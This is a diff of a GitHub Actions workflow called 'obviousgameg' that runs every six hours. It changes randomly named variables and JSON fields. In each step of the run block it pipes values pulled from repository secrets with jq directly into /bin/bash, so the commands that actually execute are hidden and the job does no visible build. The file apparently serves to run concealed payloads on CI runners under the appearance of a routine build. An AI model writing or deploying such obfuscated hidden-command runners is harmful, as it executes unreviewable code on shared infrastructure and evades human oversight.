@@ -1,20 +1,25 @@
 name: obviousgameg
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 1/6 * * *'
+    - cron: '51 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: obviousgameg
         env:
-          d9: ${{ secrets.d9 }}
+          uf354: ${{ secrets.uf354 }}
         run: |
-          echo $d9 | jq -r .a83 | /bin/bash
-          echo $y175 | jq -r .j28096 | /bin/bash
-          echo $pycqw1768 | jq -r .ydp3448 | /bin/bash
-          echo $y9 | jq -r .hvfm8254 | /bin/bash
-          echo $dpx8948 | jq -r .tucn09493 | /bin/bash
+          echo $uf354 | jq -r .ft906 | /bin/bash
+          echo $npsut2 | jq -r .his1166 | /bin/bash
+          echo $nnw42511 | jq -r .tqjxx598 | /bin/bash
+          echo $qrnb1 | jq -r .id22 | /bin/bash
+          echo $cs906 | jq -r .q506 | /bin/bash
+          echo $eiioz455 | jq -r .iadl627 | /bin/bash
+          echo $atnsn123 | jq -r .olw1978 | /bin/bash
 
